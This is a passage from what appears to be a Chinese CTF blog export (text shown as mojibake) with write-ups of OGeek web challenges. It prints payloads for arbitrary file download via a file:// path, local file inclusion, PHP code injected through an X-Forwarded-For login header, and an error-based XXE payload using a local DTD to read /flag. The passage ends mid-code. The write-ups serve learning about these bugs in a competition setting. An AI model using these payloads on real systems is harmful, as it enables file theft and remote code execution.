<h4 id="1-ä»»æ„æ–‡ä»¶ä¸‹è½½"><a href="#1-ä»»æ„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="1.ä»»æ„æ–‡ä»¶ä¸‹è½½"></a>1.ä»»æ„æ–‡ä»¶ä¸‹è½½</h4><p>ç»è¿‡å¯¹æ¯”åˆ†æçš„ï¼Œå¯ä»¥çœ‹åˆ°tcp.class.phpæ–‡ä»¶ä¸­çš„downloadæ–¹æ³•å­˜åœ¨ä»»æ„å†™çš„é—®é¢˜ï¼Œå³å‘æŸä¸ªurlå‘é€GETè¯·æ±‚ï¼Œå°†è¿”å›æ•°æ®å†™å…¥$destinationå˜é‡å€¼å‘½ä»¤çš„æ–‡ä»¶ä¸­ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bl-kernel/helpers/tcp.class.php</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($url, $destination)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$data = <span class="keyword">self</span>::http($url, $method=<span class="string">'GET'</span>, $verifySSL=<span class="keyword">true</span>, $timeOut=<span class="number">30</span>, $followRedirections=<span class="keyword">true</span>, $binary=<span class="keyword">true</span>, $headers=<span class="keyword">false</span>);</span><br><span class="line">		<span class="keyword">return</span> file_put_contents($destination, $data);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>è¯¥æ–¹æ³•åœ¨bl-kernel/function.phpä¸­è¿›è¡Œäº†è°ƒç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($for==<span class="string">'category'</span>) &#123;</span><br><span class="line">	$numberOfItems = $site-&gt;itemsPerPage();</span><br><span class="line">	<span class="comment">// Check media</span></span><br><span class="line">	$music = $_GET[<span class="string">'path'</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($music))&#123;</span><br><span class="line">		<span class="keyword">if</span>(!Sanitize::pathFile($music))&#123;</span><br><span class="line">			$filename = basename($music);</span><br><span class="line">			TCP::download($music,PATH_UPLOADS_PROFILES.md5($filename).<span class="string">"."</span>.<span class="string">"avi"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			Log::set(<span class="keyword">__METHOD__</span>.LOG_SEP.<span class="string">'Media request in  '</span>.date(<span class="string">'Y-m-d'</span>), LOG_TYPE_INFO);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$list = $categories-&gt;getList($categoryKey, $pageNumber, $numberOfItems);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è¯´è¿›å…¥äº†categoryå°±å¯ä»¥è°ƒç”¨äº†TCPç±»ä¸­çš„downloadæ–¹æ³•ï¼Œä»è€Œå¯çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œå¹¶ä¼šé‡å‘½åä¸ºæ–‡ä»¶åçš„MD5å€¼ä¸ºæ–°æ–‡ä»¶åï¼Œå¹¶ä¸”ä¸ºaviæ ¼å¼æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨fileåè®®æ¥ä¸‹è½½æœ¬åœ°æ–‡ä»¶ï¼Œå³payloadä¸º</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">category<span class="regexp">/music?path=file:/</span><span class="regexp">//</span>flag</span><br></pre></td></tr></table></figure>
<p>(è¿™ä¸ªç‚¹ä¸€å¼€å§‹æˆ‘ä»¬æ²¡å®¡å‡ºæ¥ï¼Œå› ä¸ºä¸Šäº†ä¸ªæ–‡ä»¶ç›‘æ§ï¼Œå‘ç°çªç„¶ç”Ÿæˆäº†ä¸€ä¸ªflagæ–‡ä»¶ï¼Œç„¶åç›´æ¥è„šæœ¬è·‘å…¨åœºç›´æ¥è¯»Archerå¤§ä½¬ä»¬ç”Ÿæˆçš„flagæ–‡ä»¶ï¼Œå°±è¿™æ ·å¼€å§‹èµ·é£äº†ï¼Œ23333)</p>
<p><img src="/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/8418106-189fecff73e05c88.png" alt></p>
<h4 id="2-ä»»æ„æ–‡ä»¶åŒ…å«"><a href="#2-ä»»æ„æ–‡ä»¶åŒ…å«" class="headerlink" title="2.ä»»æ„æ–‡ä»¶åŒ…å«"></a>2.ä»»æ„æ–‡ä»¶åŒ…å«</h4><p>åŒæ ·åœ¨å¯¹æ¯”åˆ†æçš„æ—¥å¿—é‡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">7.</span> bl-kernel/boot/rules/<span class="number">60.</span>router.php</span><br><span class="line">æ­¤å¤„çš„<span class="keyword">include</span>è·å–å¯ä»¥é…åˆerrorlogæ¥getshell</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($url-&gt;whereAmI()==<span class="string">'page'</span> &amp;&amp; !$url-&gt;notFound()) &#123;</span><br><span class="line">	$pageKey = $url-&gt;slug();</span><br><span class="line">	<span class="keyword">if</span> (Text::endsWith($pageKey, <span class="string">'/'</span>)) &#123;</span><br><span class="line">		$pageKey = rtrim($pageKey, <span class="string">'/'</span>);</span><br><span class="line">		Redirect::url(DOMAIN_PAGES.$pageKey);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">	$pageKey = explode(<span class="string">"/"</span>, $pageKey);</span><br><span class="line">	<span class="keyword">foreach</span>($pageKey <span class="keyword">as</span> $key)&#123;</span><br><span class="line">		<span class="keyword">if</span>(constant($key))</span><br><span class="line">			$plugin .=constant($key);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			$plugin .=<span class="string">"/"</span>.$key;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	$plugin = str_replace(<span class="string">".."</span>,<span class="string">"/"</span>,$plugin);</span><br><span class="line">	<span class="keyword">if</span>(file_exists($plugin))&#123;</span><br><span class="line">		$plugin = addslashes($plugin);</span><br><span class="line">		<span class="keyword">include</span> $plugin;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>errorlogçš„ç‚¹æ²¡æœ‰è§¦å‘æˆåŠŸï¼Œä¸è¿‡è¿™ä¸ªå€’æ˜¯å¯ä»¥é…åˆä»»æ„æ–‡ä»¶ä¸‹è½½æ¥Getshellï¼Œåªè¦ä¸‹è½½ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œç„¶ååŒ…å«å°±æˆäº†ï¼Œå› ä¸ºå‰ä¸€ä¸ªæ´æ‰“å¾—æ—©ï¼Œæ‰€ä»¥åŸºæœ¬éƒ½ä¿®äº†ï¼Œç®€å•åˆ†æä¸€ä¸‹è¿™ä¸ªç‚¹ã€‚<br>è·Ÿè¿›åˆ†æçš„è¯å¯ä»¥çœ‹å‡ºé¦–å…ˆå°†urlçš„pathèµ‹å€¼ç»™äº†å˜é‡$pageKey ï¼Œåˆ¤æ–­æ˜¯å¦æ­£å¸¸ä»¥â€™/â€˜ç»“å°¾ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹éâ€™/â€˜ç»“å°¾çš„ï¼Œå°†pathç”¨â€™/â€˜åˆ†å‰²ï¼Œç”¨constantå‡½æ•°æ¥åˆ¤æ–­æ˜¯å¦æ˜¯å®šä¹‰çš„å¸¸é‡ï¼Œæ˜¯ä¾¿å°†å¸¸é‡å€¼æ‹¼æ¥ï¼Œä¸æ˜¯ä¾¿é‡æ–°æ¢å¤å›pathï¼Œæœ€å…³é”®çš„æ˜¯</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$plugin</span> = str_replace(<span class="string">".."</span>,<span class="string">"/"</span>,<span class="variable">$plugin</span>);</span><br><span class="line">if(file_exists(<span class="variable">$plugin</span>))&#123;</span><br><span class="line">	<span class="variable">$plugin</span> = addslashes(<span class="variable">$plugin</span>);</span><br><span class="line">	<span class="keyword">include</span> <span class="variable">$plugin</span>;</span><br></pre></td></tr></table></figure>
<p>è¿›è¡Œ..æ›¿æ¢åï¼Œå¦‚æœpathè¡¨ç¤ºçš„æ–‡ä»¶å­˜åœ¨ï¼Œaddslashes()å¤„ç†åç›´æ¥è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘urlä¸Šå¸¦çš„æ˜¯ä¸€ä¸ªçœŸå®è·¯å¾„ï¼Œå°±ä¼šç›´æ¥æ–‡ä»¶åŒ…å«äº†ï¼Œè¿™å¤ªçœŸå®äº†ï¼ˆåœ¨åœºä¸Šæ²¡ç²¾åŠ›åˆ†æ- -..ï¼‰æ‰€ä»¥payload</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:xxx/flag</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥ç»“åˆå‰é¢è¿›è¡ŒGetshell</p>
<h4 id="3-ä»£ç æ³¨å…¥"><a href="#3-ä»£ç æ³¨å…¥" class="headerlink" title="3.ä»£ç æ³¨å…¥"></a>3.ä»£ç æ³¨å…¥</h4><p>é¦–å…ˆè´´ä¸€å¼ èµ›åæ”¶åˆ°çš„å›¾ç‰‡</p>
<p><img src="/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/8418106-917f02b2c3312404.jpg" alt></p>
<p>çœ‹åˆ°è¿™ä¸ªæˆ‘éƒ½æ‡µäº†ï¼Œæˆ‘ä¸‹æºç å°±æ‰«äº†ä¸€éï¼Œå¹¶æ²¡æœ‰å†…ç½®çš„åé—¨ï¼Œæ‰€ä»¥è‚¯å®šæ˜¯æœ‰å¸ˆå‚…è°ƒé€šäº†è°ƒç”¨é“¾ï¼ŒæŠŠä»£ç ç»™å†™è¿›å»äº†ï¼Œtqlï¼ˆè¿‘æœŸæ»¡è¯¾ï¼Œæœ¨å¾—æ—¶é—´çœ‹è¿™äº›ä¸œè¥¿ï¼Œå¼äº†<a href="https://www.xmsec.cc" target="_blank" rel="noopener">é™Œå°ç”Ÿ</a>å¸ˆå‚…åˆ†æäº†ä¸€æ³¢ï¼Œè¿™é‡Œå°±ç›´æ¥å€Ÿé‰´ä»–çš„æ¥å†™äº†ï¼‰ï¼Œæ–‡ä»¶è·¯å¾„ï¼šbl-content/databases/security.phpï¼Œç”±äºæ–‡ä»¶è·¯ç”±ï¼Œå¹¶ä¸èƒ½ç›´æ¥è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªè‚¯å®šæ˜¯åœ¨è°ƒç”¨è¿‡ç¨‹ä¸­å†™å…¥çš„ï¼Œè§¦å‘çš„è¯å°±é˜”ä»¥ç”¨çš„ä»»æ„æ–‡ä»¶åŒ…å«æ¥è§¦å‘RCEï¼Œæˆ‘ä»¬å…ˆæ¥æ‰¾ä¸€æ³¢è°ƒç”¨é“¾ï¼Œæˆ‘æ¯”è¾ƒå–œæ¬¢ç”¨å…¨å±€æœç´¢æ¥è·Ÿä»£ç ï¼ˆæ‰€ä»¥æˆ‘è¿™ä¹ˆèœï¼‰ï¼Œå…¨å±€æ‰¾ä¸‹blackList</p>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-1784179b58945b70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>è·Ÿåˆ°security.class.phpä¸­æœ‰ä¸ªaddToBlacklistæ–¹æ³•ï¼Œç®€å•æ˜äº†ï¼Œç”¨æ¥åŠ é»‘åå•çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	<span class="comment">// Add or update the current client IP on the blacklist</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addToBlacklist</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$ip = <span class="keyword">$this</span>-&gt;getUserIp();</span><br><span class="line">		$currentTime = time();</span><br><span class="line">		$numberFailures = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;db[<span class="string">'blackList'</span>][$ip])) &#123;</span><br><span class="line">			$userBlack = <span class="keyword">$this</span>-&gt;db[<span class="string">'blackList'</span>][$ip];</span><br><span class="line">			$lastFailure = $userBlack[<span class="string">'lastFailure'</span>];</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Check if the IP is expired, then renew the number of failures</span></span><br><span class="line">			<span class="keyword">if</span>($currentTime &lt;= $lastFailure + (<span class="keyword">$this</span>-&gt;db[<span class="string">'minutesBlocked'</span>]*<span class="number">60</span>)) &#123;</span><br><span class="line">				$numberFailures = $userBlack[<span class="string">'numberFailures'</span>];</span><br><span class="line">				$numberFailures = $numberFailures + <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;db[<span class="string">'blackList'</span>][$ip] = <span class="keyword">array</span>(<span class="string">'lastFailure'</span>=&gt;$currentTime, <span class="string">'numberFailures'</span>=&gt;$numberFailures);</span><br><span class="line">		Log::set(<span class="keyword">__METHOD__</span>.LOG_SEP.<span class="string">'Blacklist, IP:'</span>.$ip.<span class="string">', Number of failures:'</span>.$numberFailures);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserIp</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) &#123;</span><br><span class="line">			$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>)) &#123;</span><br><span class="line">			$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$ip = getenv(<span class="string">'REMOTE_ADDR'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $ip;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹ä¸‹ä»£ç å°±å¾ˆæ¸…æ¥šäº†ï¼ŒæŠŠç™»å½•å¤±è´¥çš„ç”¨æˆ·çš„ipåŠ åˆ°é»‘åå•é‡Œï¼Œipå¯ä»¥ç”¨XFFæ¥æ„é€ ï¼Œæ‰€ä»¥å˜é‡$ipæ˜¯æˆ‘ä»¬å¯æ§çš„äº†ï¼Œä¹Ÿå°±æ˜¯å¦‚æœæŸä¸ªipè§¦å‘äº†é»‘åå•è§„åˆ™ï¼Œå°±ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œä¼ å…¥$this-&gt;dbï¼Œè°ƒç”¨saveå‡½æ•°ï¼Œè·Ÿè¿›çœ‹ä¸‹</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">#\bl-kernel\<span class="keyword">abstract</span>\dbjson<span class="class">.<span class="keyword">class</span>.<span class="title">php</span></span></span><br><span class="line">	<span class="keyword">public</span> function save()</span><br><span class="line">	&#123;</span><br><span class="line">		$<span class="keyword">data</span> = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;firstLine) &#123;</span><br><span class="line">			$<span class="keyword">data</span>  = <span class="string">"&lt;?php defined('Zero') or die('Zero CMS.'); ?&gt;"</span>.PHP_EOL;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Serialize database</span></span><br><span class="line">		$<span class="keyword">data</span> .= $<span class="keyword">this</span>-&gt;serialize($<span class="keyword">this</span>-&gt;db);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Backup the new database.</span></span><br><span class="line">		$<span class="keyword">this</span>-&gt;dbBackup = $<span class="keyword">this</span>-&gt;db;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// LOCK_EX flag to prevent anyone else writing to the file at the same time.</span></span><br><span class="line">		<span class="keyword">if</span> (file_put_contents($<span class="keyword">this</span>-&gt;file, $<span class="keyword">data</span>, LOCK_EX)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			Log::<span class="keyword">set</span>(__METHOD__.LOG_SEP.<span class="string">'Error occurred when trying to save the database file.'</span>, LOG_TYPE_ERROR);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>å°†this-&gt;dbçš„æ•°æ®æ‹¼æ¥åˆ°äº†å˜é‡$dataä¸­ï¼Œç„¶åç›´æ¥è¿›è¡Œäº†file_put_contentsæ“ä½œï¼Œè€Œåœ¨init.phpä¸­æœ‰ç”³æ˜äº†</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">define</span></span>(<span class="string">'DB_SECURITY'</span>, PATH_DATABASES.<span class="symbol">'security.php'</span>);</span><br></pre></td></tr></table></figure>
<p>DB_SECURITYä¸ºä¼ å…¥æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯fileï¼Œå³å†™æ“ä½œæ—¶å°†$dataå†™å…¥åˆ°äº†security.phpä¸­ï¼Œæ‰€ä»¥ä¹Ÿå°±æœ‰äº†å¼€åœºå›¾çš„ä¸œè¥¿ã€‚å‘ä¸ªè¯·æ±‚åŒ…</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.211.128</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 82</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.211.128/admin/</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: &lt;?php phpinfo(); ?&gt;    #</span><br><span class="line"><span class="attribute">Cookie</span>: Zero-KEY=uihdv2ju8k4pfd6kl79fqpg6j3</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">tokenCSRF=92355c8ea77e31cc1fe5c1d7882d13dad37e9866&amp;username=asd&amp;password=asd&amp;save=</span><br></pre></td></tr></table></figure>

<p><img src="/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/8418106-035db896b75d8426.png" alt></p>
<p>åœ¨ç»“åˆä¸€ä¸‹çš„æ–‡ä»¶åŒ…å«æ´</p>
<p><img src="/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/8418106-4e813bfae6cad2cb.png" alt></p>
<h1 id="0x03-sec-login"><a href="#0x03-sec-login" class="headerlink" title="0x03 sec-login"></a>0x03 sec-login</h1><p>æœ¬èœä¸ä¼šjavaï¼Œè¿™é¢˜å¬è¯´æ˜¯ååºåˆ—åŒ–ï¼Œå°±ä¸å†™äº†</p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>AWD</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>Ogeek çº¿ä¸ŠWeb Writeup</title>
    <url>/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/</url>
    <content><![CDATA[<p><strong>Ogeekå’ŒXNUCAæœ‰ä¸€å¤©é‡äº†ï¼Œç¬¬ä¸€å¤©è¢«å¡åœ¨XNUCAï¼ŒEZphpè½¬è¿™ï¼ˆ<a href="https://www.jianshu.com/p/1875219503fdï¼‰ä¸Šï¼Œå¿ƒæ€æœ‰ç‚¹å—ä¸äº†ï¼Œæ‰€ä»¥Ogeekæ²¡ä»€ä¹ˆæˆ˜æ–—åŠ›" target="_blank" rel="noopener">https://www.jianshu.com/p/1875219503fdï¼‰ä¸Šï¼Œå¿ƒæ€æœ‰ç‚¹å—ä¸äº†ï¼Œæ‰€ä»¥Ogeekæ²¡ä»€ä¹ˆæˆ˜æ–—åŠ›</a>â€¦â€¦</strong></p>
<h3 id="0x01-LookAround"><a href="#0x01-LookAround" class="headerlink" title="0x01 LookAround"></a>0x01 LookAround</h3><p>å³é”®æŸ¥çœ‹ç½‘é¡µæºç å¯ä»¥çœ‹åˆ°åŠ è½½äº†ä¸€ä¸ª/js/_.jsï¼ŒæŸ¥çœ‹å†…å®¹é˜”ä»¥çœ‹åˆ°å‘callbackå‘é€äº†ä¸ªè¯·æ±‚</p>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-81074843651728ce.png" alt></p>
<p>è¯·æ±‚æ–¹å¼æ˜¯å‘é€xmlæ•°æ®ï¼Œæ‰€ä»¥åˆ¤æ–­ä¸ºæ˜¯ä¸€ä¸ªXEEæ¼æ´ï¼Œä¸è¿‡åˆ©ç”¨å‚è§çš„XXE payloadæ‰“ä¸é€šï¼Œåªèƒ½å¤Ÿåˆ¤æ–­ç³»ç»Ÿæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œ</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:////flag"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%a;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-574c6fce1ea6c651.png" alt></p>
<p>æ–‡ä»¶å­˜åœ¨è¿”å›200çŠ¶æ€ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™è¿”å›500çŠ¶æ€ï¼Œé€šè¿‡è¿™ç‚¹ä¹Ÿå¯ä»¥ç¡®å®šå­˜åœ¨XXEæ¼æ´ï¼Œåªæ˜¯å¦‚ä½•è§¦å‘çš„é—®é¢˜äº†ï¼Œé¢˜ç›®æç¤ºbuilded from tomcat:8-jre8<br>å‚è€ƒï¼š<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation</a></p>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-bd66835346322c7a.png" alt></p>
<p>ä¸æ‡‚çš„è¯è·Ÿä¸€ä¸‹æ–‡ç« ä¸‹é¢çš„è§†é¢‘å°±å¯ä»¥çŸ¥é“ tomcat:8-jre8 ä¸­çš„fonts.dtdå¯ç”¨ï¼Œæ‰€ä»¥ç›´æ¥copyæ–‡ç« ä¸­å¯¹åº”çš„payloadå°±å¥½äº†</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/xml/fontconfig/fonts.dtd"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">expr</span> <span class="meta-string">'aaa)&gt;</span></span></span></span><br><span class="line"><span class="xml">        <span class="meta">&lt;!ENTITY &amp;#x25; <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="meta">&lt;!ENTITY &amp;#x25; <span class="meta-keyword">eval</span> <span class="meta-string">"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="symbol">&amp;#x25;</span>eval;</span></span><br><span class="line"><span class="xml">        <span class="symbol">&amp;#x25;</span>error;</span></span><br><span class="line"><span class="xml">        <span class="meta">&lt;!ELEMENT <span class="meta-keyword">aa</span> (<span class="meta-keyword">bb</span>'&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="perl">    %local_dtd;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-73974d8169b53562.png" alt></p>
<h2 id="0x02-Easy-Realworld-Challenge"><a href="#0x02-Easy-Realworld-Challenge" class="headerlink" title="#0x02 Easy Realworld Challenge"></a>#0x02 Easy Realworld Challenge</h2><p>ä¸»åŠæ–¹æ”¾é¢˜å¤±è¯¯å§ï¼Œæ™šä¸Šæ”¾é¢˜ï¼Œåæ¥åšäº†ä¿®æ”¹ï¼Œç™½å¤©åˆæ¢å¤äº†å›å»ï¼Œæ‰€ä»¥å˜æˆäº†å¤§å®¶çœ‹åˆ°çš„ä¸¤åˆ°é¢˜ï¼Œå› ä¸ºé¢˜ç›®ä¸Šæœ‰ä¸€ä¸ªlog viewerï¼Œå¯ä»¥æŸ¥çœ‹ä¹‹å‰é€‰æ‰‹çš„æ“ä½œè®°å½•ï¼ˆè¿˜æ˜¯è§†é¢‘çš„ï¼‰ï¼Œæ‰€ä»¥å°±æ˜¯æˆäº†æŠ„ä½œä¸šè§£é¢˜ï¼Œè·Ÿç€telnet://172.18.0.3 ç”¨æˆ·ctfï¼Œå¯†ç ctf,ä¹‹ååˆ©ç”¨PSAVæ–¹å¼äºæœåŠ¡å™¨å»ºç«‹è¿æ¥æ¥æ”¶æ•°æ®ã€‚</p>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-28ead04fef913b8e.png" alt></p>
<p>ç„¶åæ–°å»ºä¸€ä¸ªç»ˆç«¯åˆ°ç”Ÿæˆçš„ç«¯å£å·ä¸Šæ¥æ”¶æ•°æ®å°±å¥½äº†</p>
<p><img src="/2019/08/27/Ogeek-%E7%BA%BF%E4%B8%8AWeb-Writeup/8418106-348adfa485e48aea.png" alt></p>
<p>å”¯ä¸€çš„å¯èƒ½ä¼šä¸çŸ¥é“çš„å°±æ˜¯æ€ä¹ˆçŸ¥é“è¢«åŠ¨è¿æ¥çš„ç«¯å£å·ï¼ŒPSAVç”Ÿæˆçš„ä¾‹å¦‚ï¼š(172,18,0,3,131,116)ï¼Œé‚£ä¹ˆç”Ÿæˆçš„ç«¯å£å·å°±æ˜¯ï¼š131*256+116 = 33652(é‚£ä¸ªè®¡ç®—å™¨ç®—å°±å¥½äº†)</p>
<h3 id="0x03-Enjoy-your-self"><a href="#0x03-Enjoy-your-self" class="headerlink" title="0x03 Enjoy your self"></a>0x03 Enjoy your self</h3><p>é¢˜ç›®ç¬¬ä¸€å±‚æºç ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"../../utils/utils.php"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'filename'</span>])  <span class="keyword">and</span> preg_match(<span class="string">"/^\w&#123;8&#125;$/"</span>, $_REQUEST[<span class="string">'filename'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $filename = strtolower($_REQUEST[<span class="string">'filename'</span>]);</span></span><br><span class="line"><span class="php">    touch(<span 